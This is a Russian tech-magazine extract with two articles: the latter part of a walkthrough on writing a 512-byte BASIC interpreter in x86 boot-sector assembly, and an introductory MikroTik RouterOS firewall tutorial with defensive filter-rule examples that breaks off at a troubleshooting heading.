 • print "][ello"; печатает строку и оставляет курсор на текущей строке;
 • input var считывает зна чение с клавиатуры, помещает его в перемен‐
  ную var (a..z);
 • goto expr переходит на указанную строку прог раммы;
 • if expr1 goto expr2 — если expr1 не 0, прыгнуть на строку expr2,
   иначе на сле дующую пос ле if .

Пример: if c‐5 goto 2 (если c‐5 не 0, пры гаем на строку 2).


НАЧИНАЕМ ДЕЛАТЬ ИНТЕРПРЕТАТОР
Начинаем с того, что зада ем области памяти, которыми будем пользоваться:
 • буфер для текста из командной строки;
 • буфер для хранения исходника прог раммы;
 • массив для хранения переменных (от a до z);
 • указатель на текущую строку программы.





Все сегментные регистры нацеливаем на CS. Затем сбрасываем «флаг нап‐
равления», чтобы строки обра батывались слева направо, а не наоборот (ког‐
да будем обращаться к инс трукциям вроде stosb). Буфер, который пред‐
назначен для исходника программы, заполняем символом 0x0D (символ воз‐
врата каретки, более известный как клавиша Enter).





Исходник программы на бейсике будем обра баты вать как двумерный сим‐
вольный массив: 1000 × 20.
   Если введешь строку больше 19 символов, она заедет на соседнюю.
В текущей реализации интерпретатора этот баг не отсле живается. Просто
помни, что больше 19 символов в строчку вписывать нельзя.


Запускаем главный рабочий цикл
Здесь сначала восстанавлива ем ука затель стека (регистр SP). На тот случай,
если программа на бейсике обрушилась из‐за ошиб ки.
  Затем сбрасываем ука затель running (текущая строка программы). Потом
вызываем подпрограмму input_line, которая  ждет, пока программист
что‐нибудь  напечатает.  Подпрограмма  сохраня ет  полученную  строку
в регистр SI.
   Дальше смотрим, начинается строка с номера или нет. Если с номера, нам
надо записать ее в буфер, который отведен под исходник. Для этого сначала
вычисляем адрес, куда записывать строку. За это у нас отвечает подпрог‐
рамма find_address (результат кладет в регистр DI). Опре делив нужный
адрес, копируем туда строку: rep movsb.
   Если в начале строки нет номера, сра зу выполняем ее: execute_state‐
ment.





Об рабаты ваем стро ки программы
Строки программы обра батываем следующим обра зом. Берем первое слово
из строки и последовательно сравниваем его с каждой записью из таблицы
@@statements (см. внизу статьи последний кусок кода). В этой таблице
общим списком перечислены команды, операторы и функции, которые
понимает наш интерпретатор.
  Обрати внимание, какую эвристику я здесь использую, чтобы сэкономить
байты на обработку условного оператора. Перед точкой входа execute_s‐
tatement я поставил дополнительный вход в ту же самую подпрограмму:
@@if_handler.
  Зачем? Чтобы не надо было писать отдельный обработчик для конструк‐
ций вроде if a‐2 goto 10. Если результат выражения (в данном случае a‐2)
равняется нулю, мы не заходим в if, то есть игнориру ем остаток строки (в
нашем случае goto 10).
  С if разобрались. Дальше обра батываем остальные команды, операторы
и функции. Начинаем с того, что пропус каем лишние пробелы, которые прог‐
раммист добавил для своего удобства. Если в стро ке нет ничего, кроме про‐
белов, просто игнориру ем ее.





Но если строка не пус тая, присматриваемся к ней внимательно. Сначала
перебираем по порядку таб лицу @@statements и сверяем свою строку с каж‐
дой записью оттуда. Каким обра зом сверяем? Считываем размер строки (в
случае run это 3) и затем сравниваем, используя repe / cmpsb.
   Если совпадение обнаружилось, то регистр DI теперь указывает на соот‐
ветствующий адрес обработчика. Поэто му мы без лишних телодвижений пры‐
гаем туда: jmp [di]. Что бы лучше понять, в чем тут прикол, загляни в конец
статьи, посмотри, как устро ена таблица @@statements. Подсказ ка: метки,
которые начинаются с @@, — это как раз и есть адреса обработчиков.
   Если всю таблицу переб рали, но совпадения так и не нашли, значит,
текущая строка программы — это не команда, не оператор и не функция. Раз
так, может быть, это название переменной? Пры гаем на @@to_get_var, что‐
бы проверить.





Дальше проматываем регистр DI к следующей записи таб лицы. Каким обра‐
зом? Прибавляем CX (длина имени текущей команды, оператора или функции
плюс еще два байта (адрес обра ботчика). Потом восстанавливаем значение
регистра SI (rep cmpsb перемо тала его вперед), чтобы он опять указывал
на начало строки, по которой мы выполняем поиск в таблице операторов.
   Теперь DI указывает на следующую запись из таблицы. Если эта запись
ненулевая, прыгаем на @@next_entry, чтобы сравнить строку программы,
вернее ее начало, с этой записью.





Если мы прошли всю таблицу, но так и не нашли совпадения, значит, текущая
строка — не команда, не оператор и не функция. В таком случае это, скорее
всего, конструкция присваивания вроде var=expr. По идее, других вариантов
больше нет. Если, конечно, в исходник не закралась синтакси ческая ошибка.
   Теперь нам надо вычислить выражение expr и поместить результат
по адресу, с которым свя зана переменная var. Подпрограмма get_variable
вычисляет нужный нам адрес и кладет его на стек.
  После того как адрес найден, проверя ем, есть ли после име ни перемен‐
ной оператор присваивания. Если да, нам надо его выполнить. Но в целях
экономии байтов мы сделаем это не здесь.
   Чуть ниже нам с тобой так и так придется реализовывать прис ваивание
внутри функции input. Вот на тот кусок кода мы и прыгнем: @@assign.
Целиком нам тут функция input ни к чему. Понадобится только ее финальная
часть,  вот ее и берем. Обратно  в execute_statement  воз вращаться
не будем. Нужный ret выполнит сама функция input.





Если знака присваивания нет, печатаем сооб щение об ошибке и прекращаем
выпол нение программы, то есть прыгаем на @@main_loop. Там интерпре‐
татор восстановит указатель стека и смо жет работать дальше, несмотря на то
что наткнулся на синтаксическую ошибку.





Вы пол няем коман ду list
Команда list выводит на экран листинг прог раммы, которая записана
в буфере. Каким образом она работает?
  Сначала сбрасываем в ноль номер текущей строки в программе: xor ax,
ax. Затем по номеру строки вычисляем адрес, откуда считывать строку прог‐
раммы: find_address. Ког да адрес строки найден, сравниваем первый сим‐
вол с 0x0D, то есть смотрим, не пус тая ли строка. Если пус тая, переходим
к следующей.
  Но если нет, то выводим ее на экран. Сна чала отоб ражаем ее номер: out‐
put_number. Потом считыва ем из буфера саму строку посимвольно, пока
не наткнемся на 0x0D. И так же посимвольно выводим ее на экран.
  Затем переходим к следующей стро ке программы (inc ax) и повторяем
все то же самое. Продолжаем до тех пор, пока не достигнем max_line, то
есть 1000.





Вы пол няем фун кцию input
Функция input позволя ет ввес ти число с клавиату ры. Работает она так.
  Сначала вычисляем адрес переменной, которая задана в программе.
Потом выводим знак вопроса и ждем, пока поль зователь что‐нибудь напеча‐
тает.
  На случай, если поль зователь введет не прос то чис ло, а какое‐нибудь
заковыристое выражение, мы прогоня ем введенную строку через process_‐
expr. Конечный результат помещаем по тому адресу, который вычис лили
в начале подпрограммы. В этом нам поможет инструкция stosw.





ОБРАБАТЫВАЕМ ВЫРАЖЕНИЯ
Обработка выражений будет трехуровневая.
 1. Сложение и вычитание.
 2. Умножение и деление.
 3. Вложенные выражения (в скоб ках), имена переменных и числа.

На первом уровне, у которого приоритет самый низкий, сразу же передаем
управление второму уровню: вызываем expr2_left. Затем, когда более при‐
оритетные операции обработа ны, смотрим на следующий символ. Если
это знак сложения или вычитания, обрабатываем его. Каким образом?
  Сначала сохраняем левое значение: push ax. Затем передаем правую
часть выражения второму уровню: expr2_right. Когда более приоритетные
операции выполнены, берем левое значение (pop cx) и выпол няем нужную
операцию с правым: add ax, cx или sub ax, cx.
  Наконец, зацикливаемся на @@next_sub_add, что бы корректно вычислять
выражения вроде 1+2+5‐4.





На вто ром уровне делаем все то же самое, что и на первом. Сначала опять
передаем управле ние более приоритетному уровню: обращаемся к ex‐
pr3_left. Затем смотрим на следующий символ. Если это знак деления
или умножения, обрабатываем его. В конце, как и в предыдущем случае, зак‐
ручиваем цикл (@@next_div_mul), чтобы интерпретатор понимал выражения
вроде 3*4*2/1.





Обрати внимание, что при такой орга низа ции уровней наш интерпретатор
автоматически  учитыва ет  приоритет  операций.  Например,  выражение
5*6+3*4 вычисляется как (5*6)+(3*4).
  На третьем уровне обра батываем скоб ки (вложенные выражения), име‐
на переменных и числа.
  Сначала удаляем про белы из входной строки. Затем смотрим на левый
символ. Если это открывающая скобка, запус каем рекурсию: обращаемся
к process_expr. После того как вло женное выражение обработано, проверя‐
ем, есть ли у него закрывающая скоб ка. Если нет, выдаем ошибку. А если
есть, пропускаем пробелы, следующие за ней, и радостно делаем ret.
  Но что, если слева не открывающая скоб ка, а какой‐то другой символ?
Может быть, это имя переменной? Проверяем: cmp al 0x40 / jnc @@yes_‐
var.
   Если предположение подтвердилось, идем считывать значение перемен‐
ной. А если нет, значит, текущий символ — это кусок числа. Отступаем
на один шаг (dec si) и вызываем dec_str_to_number, чтобы прочитать чис‐
ло.





                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ
          МИКРОБ
               ПИШЕМ БЕЙСИК НА АССЕМБЛЕРЕ
                       И УМЕЩАЕМ В 512 БАЙТ





Под программа: адрес перемен ной по ее име ни
У этой подпрограммы две точки входа. На первой точке входа (get_var) чита‐
ем букву переменной при помощи lodsb, на второй (get_var_2) — исполь‐
зуем имя переменной, которое передано через регистр AL. Изврат, конечно,
но чего не сделаешь, что бы сэкономить пару‐трой ку байтов.
   Теперь,  когда имя переменной  у нас  есть, надо вычислить адрес,
с которым она связана. Делаем это в три шага.
 1. Выполняем and al, 0x1F, чтобы извлечь номер переменной; здесь
   ASCII‐значения 0x61–0x7A конвертируются в 0x01–0x1A.
 2. Умножаем результат на 2, поскольку каждая переменная использует 16‐
   битное слово в памяти.
 3. Добавляем к адресу стар шую его часть: mov ah, vars>>8 .

Все! Мы знаем ячейку памяти, с которой свя зана переменная.
  Обрати внимание, что этот код переплетен с подпрограммой, которая
пропускает про белы. У той подпрограммы тоже две точки входа. Первая
(skip_spaces) пропускает пробелы, которые идут за переменной, вторая
(skip_spaces_2) делает то же самое, но только оставляет первый пробел.





Под программа: печать десятич ного числа
Подпрограмма печатает на экране число, переданное через регистр AX.
Каким образом? Рекурсивно делим AX на 10. После каждого деления сох‐
раняем остаток на стеке. После того как доделились до нуля, начинаем
выходить из рекурсии. Перед каждым выходом снимаем со стека оче редной
остаток и выводим его на экран.
  Несколько примеров. Если AX  =  4, то пос ле деления на 10 в AX
будет 0 и поэтому output_number не зайдет в рекурсию. Просто выведет
остаток, то есть четверку, и все.
   Если AX = 15, то после деления на 10 в AX будет единица. И поэтому под‐
программа залезет в рекурсию. Покажет там единичку, затем выйдет из внут‐
реннего вызова в основной и там уже напеча тает цифру 5.
  Обрати внимание на jmp в кон це и на то, что у прог раммы нету своего ret.
Это еще один небольшой  хак, что бы сэконо мить парочку байтов. Мы
не вызываем подпрограмму вывода символа, а джампимся на нее. Нужный
нам ret она сделает сама.





Под программа: из десятич ной стро ки в шестнад цатерич ное число
Подпрограмма переводит строку, в которой записано десятичное число (на
нее указывает регистр SI), и записывает результат в регистр AX.
  Переводить десятич ную строку в шес тнадцатеричное чис ло будем вот как.
Проходим в цикле по всем цифрам слева направо. Каждый раз умножаем
аккумулятор на 10 (первый раз там у нас ноль) и прибавляем к нему текущую
цифру. Если натыкаемся в строке на что‐то отличное от цифры, сконфуженно
выходим — ошибка.
  Обрати внимание: между cmp al, 10 и условным переходом стоит две
операции. Так что итоговый результат всег да попадает в регистр AX, даже
в случае ошибки.





ВЫПОЛНЯЕМ КОМАНДЫ RUN/GOTO
Команды run и goto запускают программу, которая записана в буфере. Run
запускает ее с самого начала, а goto — с про изволь ной строчки. Обе коман‐
ды будем обрабатывать одной и той же подпрог раммой.
   Когда интерпретатор видит команду run, он сна чала превращает ее в goto
0 и дальше обрабатывает ее точно так же, как goto. Каким образом прев‐
ращает? Сбрасывает регистр AX в ноль и прыгает на @@goto_handler.
  Выполнять команду goto начина ем с того, что вычисляем выраже ние,
которое записано после goto. Результат, то есть номер строки, куда пры гать,
помещаем в AX.
  Затем по номеру стро ки вычисляем адрес, где записана эта строка: find‐
_address.
  Обрати внимание, что командой goto можно поль зоваться как в интерак‐
тивном, так и в обыч ном режиме. То есть и в программе ее использовать
в качестве опе ратора, и с клавиату ры набирать для непосредственного
выпол нения.
   Что делает инструкция сравнения cmp word [running],  0? Смотрит,
откуда мы сюда попали: из интерактивного режима или из обычного.
   Если из обыч ного режима, прос то записываем в переменную running
адрес, откуда дальше выполнять программу. На следующем такте интерпре‐
татор вытащит с это го адреса нужную стро ку программы и выпол нит ее.
  Но если мы попали сюда из интерактивного режима (программист вошел
в программу не через run, а через goto), то прыгаем на строку исходника,
которая указана в goto.





А вот та подпрограмма, которая по заданному номеру вычис ляет адрес стро‐
ки в исходнике. Каким обра зом? В AX у нас записан номер строки. Умножаем
его на стандартную длину строки и прибавляем адрес первой строки прог‐
раммы. Так мы получаем иско мый адрес.





Под программа: принимаем с клавиату ры стро ки исходника
Теперь научим наш интерпретатор принимать с клавиатуры строки прог‐
раммы. За это будет отвечать подпрограмма input_line. На входе она
получает символ командной строки (через регистр AL): знак «больше».
  Сначала выводим коман дную строку. Затем нацеливаемся на буфер, куда
будем сохранять текст из командной стро ки. Потом читаем символ с кла‐
виатуры и, если это не Backspace (0x08), сохраня ем его в буфер. Но если
нажата Backspace, умень шаем регистр DI на еди ницу, чтобы он указывал
на предыдущий символ.





ВЫПОЛНЯЕМ ФУНКЦИЮ PRINT
Функцию print сделаем такой, что бы она понимала разный синтаксис:
 • print переводит курсор на следующую строку;
 • print "Hello" печатает текст и ставит курсор на следующую строку;
 • print "Hello;" печатает текст и оставляет курсор на текущей строке;
 • print 5 печатает число и ставит курсор на следующую строку;
 • print 5+2; печатает число и оставляет курсор на текущей строке.

Первое сравнение, cmp al, 0x0D, отслеживает первый вари ант синтакси‐
са — без аргументов.
   Второе срав нение, cmp al, '"', отслеживает два варианта синтаксиса,
когда надо напечатать строку. В этом случае поочередно выводим все сим‐
волы, пока не наткнемся на закрывающую кавычку или на 0x0D. Если наткну‐
лись на 0x0D, значит, программист забыл ввести вторую кавычку. Ругаться
ошибкой на него за это не будем.
   Дальше смотрим, есть ли после кавычки точка с запятой. Если нет,
переводим курсор на следующую строку.
  На метке @@no_quote обра батываем два варианта син таксиса, когда надо
напечатать число. Если вместо числа нам подсунули выражение, вычис ляем
его. Потом выводим его и смотрим, есть ли даль ше точка с запятой. Если нет,
переводим курсор на следующую строку.





Под программы: ввод‑вывод символов
Сделаем две вспо могательные подпрог раммы — для input и для print.
  Подпрограмма input_key считыва ет нажатую клавишу при помощи пре‐
рывания BIOS 0x16, функция 0x00. ASCII‐код клавиши попадает в регистр AL.
  Обрати внимание: эта подпрограмма перекрывается со следующей,
поэтому она не заканчивается инструкцией ret. Зачем здесь такое трюкачес‐
тво? Чтобы, не отхо дя от кас сы, в смысле не тра тя допол нительных байтов,
вывести на экран символ, который пришел с клавиатуры.




Подпрограмма output_char сна чала про веря ет, не нажат ли Enter: cmp al,
0xD. Если так, то в довесок к символу 0xD печатаем еще и 0xA. Без 0xA курсор
будет просто ухо дить влево, не перескакивая на следующую строку. Символы
печатаем при помощи BIOS: прерывание 0x10, функция 0x0E.





ТАБЛИЦА КОМАНД, ФУНКЦИЙ И ОПЕРАТОРОВ
Дальше таблица команд, функций и операторов, которые понимает наш
интерпретатор. Каждая запись состоит из трех полей: длина строки; имя
команды, функции или операто ра; точка входа в подпрограмму‐обработчик.
Ноль в конце таблицы — это подсказ ка интерпретатору, что таблица закон‐
чилась.
  При такой структуре очень удоб но добавлять новые команды, функции
и операторы. Просто дописываешь сюда еще одну строчку, затем вставляешь
обработчик в удобном мес те, и все. Больше ничего править в коде не надо.
  Два последних байта нужны для того, чтобы BIOS поняла, что в бутсекторе
записана не какая‐то белиберда, а вразумительная программа. В нашем слу‐
чае интерпре татор бейсика.





ТЕСТИРУЕМ ИНТЕРПРЕТАТОР: ПИШЕМ ПРОГРАММУ
«ТРЕУГОЛЬНИК ПАСКАЛЯ»
Треугольник Паскаля — это треугольная таб лица биноминальных коэффици‐
ентов. Свер ху стоит число 1. Чис ла, которые появляются в последующих
строках, — это сумма двух ближайших вышес тоящих чисел. Вот исходник,
который надо скормить интерпретатору.





Если ты все сделал пра вильно, интерпретатор должен выдать что‐то похожее
на такую картинку.





Интерпретатор работает пра вильно? Если так, можешь гордиться собой. Ты
только что своими руками создал полноценный интерпре татор язы ка бейсик.
При желании можешь попытать ся рас ширить его функциональность. Нап‐
ример:
 • добавить команду cls (очис тка экрана);
 • добавить операторы gosub и return, чтобы можно было писать подпрог‐
   раммы;
 • реализовать поддержку массивов.

Напоследок пара организационных моментов.
 1. Для компиляции прог раммы используй NASM: nasm f bin MicroB.
  asm.asm o MicroB.asm.com.
 2. Если боишься редактировать бутсектор, можешь тестировать интерпре‐
   татор через эмулятор DOS — нап ример, DOSBox.
АДМИН
        СТЕНА
        ОГНЯ

        УЧИМСЯ НАСТРАИВАТЬ ФАЙРВОЛ
                НА ПРИМЕРЕ MIKROTIK





                                                                       Дмитрий Бубнов
                                                                                   Тренер MikroTik. Автор
                                                                                               канала
                                                                                                         https://t.me/mikrotikninja
                                                                                        dv@bubnovd.net





Назначение файрвола — фильтра ция трафика и манипу‐
ляция пакетами. Именно он становится первым и, к сожале‐
нию,  во  многих  случаях  последним  бастионом  сети.
В интернете полно рекомендаций, как настроить эту часть
системы. Но без думное копиро вание чужих правил может
принести больше вреда, чем пользы. Поэтому сначала нужно
разобраться, как работа ет и что может файрвол в RouterOS.


Файрвол, как и многое другое в RouterOS, пришел из Linux и представляет
собой доработанный iptables. Поэто му многие ману алы по нас тройке iptables
легко можно сконвертировать в формат RouterOS. Файрвол состоит из сле‐
дующих таблиц:
 • Filter — занимается фильтра цией трафика — определя ет, пропус тить
   пакет в сеть или отбросить его. Мы будем рас сматривать работу только
   этой таблицы;
 • NAT —  Network  Address  Translation. Изменяет проходящие  пакеты.
   Поменять адрес источника или порт наз начения — дело именно этой таб‐
   лицы. В основном она использует ся для обеспечения доступа в интернет
   из локалки и обратно. Иног да без NAT невозможно работать в плохо спро‐
   ектированных сетях, а еще его, бывает, используют в качестве «кос тыля»;
 • Mangle — классифицирует и маркирует трафик и может менять некото‐
  рые поля в заголовке (TTL, ToS, DF). Применяется для построения сложных
   путей трафика (например, когда подключено два провай дера или нужны
   разные пути трафика для RDP и VoIP);
 • Raw — обрабатывает пакеты до их попада ния в Connection Tracking. При‐
   годится для защиты от DoS или при работе с большими объемами тра‐
   фика.

Таблицы состоят из цепочек. Цепочки в разных таблицах могут отличаться.
Чуть позже станет ясно почему. В нашей таблице Filter три цепочки:
 • input — трафик к самому роутеру. Обязательное условие попадания в in‐
   put — адресом назначения пакета должен быть один из адре сов роутера,
  широковещательный адрес сети или широковещательный адрес работа‐
  ющей на роутере службы. Сюда попадает WinBox, SSH, WebFig, ping, VPN
   и другой трафик, предназначенный роутеру. Пол ный спи сок можешь пос‐
   мотреть в вики. В этой цепочке мы дол жны защищать сам роутер;
 • output — трафик от роутера. Ответы на прилетевшее в input или новые
   пакеты от роутера (пинг, VPN, SSH‐сес сия с самого роутера). Эта цепочка
   редко используется, так как час то роутер счи тает ся доверенным зве ном
   и пакеты, генерируемые им, по умолчанию легитимны. Но, как показывает
   история взломов, контроль исхо дящего трафика может выявить зараже‐
   ние на начальных этапах;
 • forward — трафик, про ходящий через роутер (когда пакет при летел
   в один интерфейс и вылетел с другого или того же самого). Трафик
   из локалки в интернет, из интернета в локалку, из одного VLAN локал ки
   в другой;
 • user chains — пользовательские цепочки. Админ может создавать цепоч‐
   ки правил по своему усмотрению. Это быва ет полезно для декомпозиции
   больших  конфигура ций.  К  примеру, можно  весь  трафик  на  пор‐
   ты 80 и 443 завернуть в отдельную цепочку WEB и в ней уже делать десятки
   правил для фильтрации — это визуально упростит настройку, хотя качес‐
   твенно на прохождение трафика не повлияет.





Два важных момента, о которых нуж но помнить.
  Момент первый. У тра фика в forward всегда есть входящий и исходящий
интерфейсы — трафик влетел в input, обра ботался процессом маршру тиза‐
ции и должен вылететь в output. У входного тра фика не может быть исходяще‐
го интерфейса — он обработа ется  внутри  роутера и никуда дальше
не полетит. Также у выходного тра фика не может быть входящего интерфей‐
са — этот трафик генерируется самим роутером (это либо новый трафик,
либо созданный роутером ответ на трафик, пришедший в input).
  Момент вто рой. У трафика не сущес твует «внешнего» или «внутренне‐
го» интерфейсов. Роутеру плевать, что ты считаешь внешним, — для него
есть интерфейс, в который тра фик вошел, и интерфейс, с которого трафик
уйдет.
  Правила образуют цепочки. У каждого пра вила может быть только одна
цепочка. По умолчанию политика у всех цепочек — все разрешено. Правила
срабатывают в таблицах в зависимости от их порядка: сначала пакет обра‐
ботается первым правилом, затем вто рым и так далее. Хорошим тоном счи‐
тается упорядочивать пра вила внутри таб лиц по цепочкам: сначала — пачка
правил input, затем — forward, в конце — output.
   Трафик будет проходить по пра вилам только в пределах своей цепочки.
И если сначала идет input, потом forward, затем сно ва input, то трафик input
все равно никогда не попадет в forward, то есть такое расположение правил
не повлияет на прохождение трафика, а только запутает админа. В пределах
одной таблицы пакет не перепрыгнет из одной цепочки в другую, пока админ
это явно не укажет.





                                table_chain_rule


CONNECTION TRACKING
Еще одна важная вещь для понимания работы фай рвола — механизм опре‐
деления  состояния  соединений —  Connection  Tracking  (или  прос то
ConnTrack). У RouterOS есть специальная таб лица, в которой хранятся данные
о состоянии соединений. Благодаря ей работает NAT и многие другие части
файрвола.
  Механизмы ConnTrack проверя ют, принадлежит ли пришедший на роутер
пакет какому‐либо из потоков, чтобы применить к нему политики всего потока
или как‐то упорядочить пакеты в пределах одно го или нес кольких потоков
(например, для нарезки скорос ти).





                               ConnTrack

Для ConnTrack существу ют четыре состояния пакетов:
 • new — новый пакет, не принадлежащий ни одно му из известных потоков.
   Это может быть первый пакет для коннекта к серверу RDP, или первый
   пакет в потоке WinBox, или запрос к DNS. Система запоминает Source IP,
   Source Port, Destination IP, Destination Port и некоторые другие параметры
   и записывает эти данные в таблицу. Следующий пакет с такими же дан‐
  ными будет относиться к записанному потоку;
 • established — пакет, принадлежащий сущес твующему потоку. То есть
   пакет, у которого Source IP, Source Port, Destination IP, Destination Port под‐
   ходят под одну из записей таб лицы ConnTrack (или обратный пакет);
 • related — пакет, порожденный дру гим потоком. Некоторые протоколы,
   такие как FTP, SIP, PPTP, используют для работы несколько потоков. Нап‐
   ример, управляющие команды FTP ходят по порту TCP 21, но данные
   передаются с порта TCP 20. При попытке получения или отправки данных
   на FTP в потоке на порт 21 сервер сообщает: «А сей час я открою 20‐й
   порт, и ты забирай данные с него», пос ле этого клиент посылает пакет
   на 20‐й порт сервера. Этот пакет будет считаться related, так как он порож‐
   ден потоком 21‐го порта;
 • invalid — все, что не относится к перечисленным выше состояниям. При‐
   мер: сессия корректно закрылась, но из‐за ошибок маршрутизации часть
   пакетов из середины сессии улетела другим путем. Когда они пришли, их
   сессия уже закрыта и роутер о них ничего не зна ет. Они не new и не отно‐
   сятся к существующим соединениям, поэтому считаем их invalid.

Состояние потока не свя зано с флагами TCP: SYN, ACK, FIN. Для UDP и дру‐
гих stateless‐протоко лов в таблице ConnTrack тоже содержатся все воз‐
можные состояния.





                               Connstate

Работа ConnTrack требует ресурсов процессора и при больших объ емах тра‐
фика может существенно нагрузить CPU. Но ConnTrack нужен не везде, и его
можно отключить. Например, у провайдеров на стыке с вышестоящим про‐
вайдером стоят роутеры, которые молотят десятки гигабит трафика. На этих
роутерах, как правило, нет NAT (прямая маршру тизация), а трафик фильтру‐
ется уровнем ниже, чтобы не перегружать и без того нагруженный бордер. То
есть в этом случае ни к чему проверять каж дый пакет на принадлежность
какому‐либо потоку.
  Нажав кнопку Tracking, можно отклю чить механизм ConnTrack или подкру‐
тить таймеры. В большинстве случаев тебе не понадобится заходить в эти
настройки, но знать о них нужно. Режима ConnTrack три: что такое yes и no,
думаю, понятно, а в режиме auto ConnTrack выключен до тех пор, пока
хотя бы один пакет не попадет в существу ющие правила таблицы NAT
или Filter.


           WARNING

                    Вык люченный ConnTrack ломает NAT и фичи фай‐
                      рвола, основанные на тре кинге потоков: connec‐
                            tion‐bytes, connection‐mark, connection‐type, con‐
                            nection‐state,  connection‐limit,  connection‐rate,
                            layer7‐protocol, new‐connection‐mark, tarpit.





                                    Tracking



                                     Продолжение статьи →
АДМИН               ← НАЧАЛО СТАТЬИ
         СТЕНА ОГНЯ
                 УЧИМСЯ НАСТРАИВАТЬ ФАЙРВОЛ
                           НА ПРИМЕРЕ MIKROTIK





РЕКОМЕНДАЦИИ ПО НАСТРОЙКЕ
Переходим к практике настройки. В этой статье я рас скажу о таблице Filter —
той, что занимается фильтра цией тра фика. Как мы выяснили чуть выше,
за трафик к самому роутеру отвечает цепочка input, а за трафик, который про‐
ходит через роутер, — forward. Займем ся защитой самого роуте ра.
   Первое и самое главное, что нужно помнить при работе с файрволом,
было описано еще в утерянной главе «Слова о полку Игореве»: «удаленная
настройка файрвола — к дальней дороге». Так что уважай предков — чти их
заветы и используй Safe Mode.
   Работает этот режим так: ты нажимаешь кнопку Safe Mode в интерфейсе,
и она остается нажатой. Дальше ты делаешь все, что собирался, но при‐
менятся эти изменения, только когда ты снова кликнешь по кнопке. Если они
приведут к обрыву взаимо действия роутера и конфигуратора WinBox (нап‐
ример, если ты зафильтровал свои же пакеты или отключил интерфейс), то
роутер вернется в состояние, которое было до входа в Safe Mode.
   Запоминается только 100 действий, но этого хва тит на большинс тво слу‐
чаев. Перезагрузки не будет — откат мгно венный. Из консоли этот режим
активируется по Ctrl‐X.





                                Safe Mode

Есть два подхода к настройке файрвола:
 • разрешено все, что не запрещено;
 • запрещено все, что не раз решено.

Ни один из них нельзя назвать однозначно правиль ным. Я приверженец вто‐
рого подхода, но в незнакомых сетях при меняю первый.
   Чтобы разрешить нуж ный трафик, нужно определиться с этим самым тра‐
фиком. В случае с input это сделать довольно прос то. Вот что нужно для кор‐
ректной работы роутера.
 1. Management:  WinBox, SSH,  в  некоторых  слу чаях  WebFig,  например
   для просмотра графиков нагрузки.
 2. Если провайдер выда ет адрес по DHCP, то разрешить этот протокол
   на внешнем интерфейсе.
 3. Если роутер является сервером DHCP, то раз решить этот протокол
   на внутренних интерфейсах.
 4. То же самое с DNS.
 5. Если будем поднимать туннели, то разрешить их.
 6. OSPF.
 7. ICMP.
 8. NTP.
 9. Neighbor Discovery.
10. SNMP.
11. Другие сервисы.

Определились? Открываем нужное и закрываем все остальное.
  Файрвол работает по принципу «если [усло вие], то [действие]». Если
выпол няются усло вия, заданные во вкладках General, Advanced, Extra, то
к пакету применяется действие из вкладки Action. На сегодня нам будет дос‐
таточно условий src/dst address, protocol, src/dst port, in/out interface, connec‐
tion‐state. Их значения понятны по названию, но если вдруг неясно — впе ред,
читать про основы TCP/IP. Самые рас простра ненные действия: accept — раз‐
решено, drop — запрещено (пакет прос то уничтожится), reject — запрещено,
но отправитель получит информа цию, что пакет был уничтожен по причине,
указанной в reject‐with.
   Каждое правило на пути пакета отнимает про цес сорное время. И если
в небольших сетях это некритично, то при серь езных объ емах трафика нужно
учитывать этот момент. Рас смот рим на примере.


/ip firewall filter
add action=accept chain=input dst‐port=8291 protocol=tcp src‐address=
10.0.0.0/24
add action=accept chain=input dst‐port=8291 protocol=tcp src‐address=
10.10.0.0/24
add action=accept chain=input dst‐port=8291 protocol=tcp src‐address=
10.11.0.0/24
add action=accept chain=input dst‐port=22 protocol=tcp src‐address=
10.0.0.0/24
add action=accept chain=input dst‐port=22 protocol=tcp src‐address=
10.10.0.0/24
add action=accept chain=input dst‐port=22 protocol=tcp src‐address=
10.11.0.0/24
add action=drop chain=input

В этом случае при попытке подклю читься  к роутеру по SSH с адре‐
са 10.11.0.11 файрвол будет шесть раз обращать ся к CPU с вопросом, про‐
пустить ли этот трафик. Выг лядит это примерно так: «8291 — не наш порт —
пропускаем дальше. 10.0.0.0/24 — не наша подсеть, пропус каем дальше. То
же для 10.10.0.0/24, и только шес тое правило подходит». На шестом шаге
файрвол поймет, что трафик легитимный и его можно пропус тить.
   Пакеты FTP и весь другой нераз решенный тра фик будет дергать CPU семь
раз — первые шесть и пос ледний дроп. И это в выдуманном примере из семи
правил. В реальной жиз ни пра вил на порядок или два больше.
   Первое, что мы можем сделать, — объединить два порта в одном правиле:


/ip firewall filter
add action=accept chain=input dst‐port=8291,22 protocol=tcp
src‐address=10.0.0.0/24
add action=accept chain=input dst‐port=8291,22 protocol=tcp
src‐address=10.10.0.0/24
add action=accept chain=input dst‐port=8291,22 protocol=tcp
src‐address=10.11.0.0/24
add action=drop chain=input





Немного снизили нагрузку. Но оста лось три идентичных правила с разницей
лишь в адресах. С помощью списка адресов (Address List) мы можем объ еди‐
нить их в одно.


             INFO

                        Address List — фича RouterOS, которая позволяет
                      объединять  IP‐адреса,  подсети  и DNS‐име на
                        в одну запись.


Создаем три записи в одном Address List.





                       Make Address List


/ip firewall address‐list
add address=10.0.0.0/24 list=MGMT
add address=10.10.0.0/24 list=MGMT
add address=10.11.0.0/24 list=MGMT

И применяем его к нашему пра вилу.





/ip firewall filter
add action=accept chain=input dst‐port=8291,22 protocol=tcp
src‐address‐list=MGMT
add action=drop chain=input

Так из семи правил мы получили два и изба вились от лишней нагрузки.
По аналогии со списками адресов работают списки интерфейсов (я рассмат‐
ривал их в предыдущей статье — «Защища ем MikroTik»): объединяем в один
interface list интерфейсы разных провайдеров и вешаем правила уже не на
сами интерфейсы, а на списки. Так мы не толь ко уменьшим нагрузку, но и
упростим жизнь админа: чем меньше правил, тем удобнее обслу живать сис‐
тему.
  Еще один способ облегчить работу фай рволу — использовать ConnTrack.
Понятно, что established‐пакетов будет намного больше, чем new, related и in‐
valid, вместе взятых. А раз мы разрешили первый пакет из потока, то все
остальные пакеты в этом потоке мож но счи тать легитимными. Поэтому просто
создаем правило «разрешить established» и помещаем его в самом верху.





Выбирай нужные тебе про токолы и порты, соз дай соответству ющие спис ки
адресов и интерфейсов. Открой все, что нуж но, и поставь пос ледним пра‐
вилом drop  all. На этом основную настройку цепочки input можно считать
завершенной.
   К слову, по умол чанию файрвол снаб жен дос таточно крепкой настрой‐
кой — ее вполне хватит, что бы нормально работа ла сеть практически любых
размеров. Но всегда есть какие‐то осо бенности и любой конфиг можно улуч‐
шить с уче том своих условий.
   Для примера конфигура ции можешь взять мой шаб лон.


ТРАБЛШУТИНГ
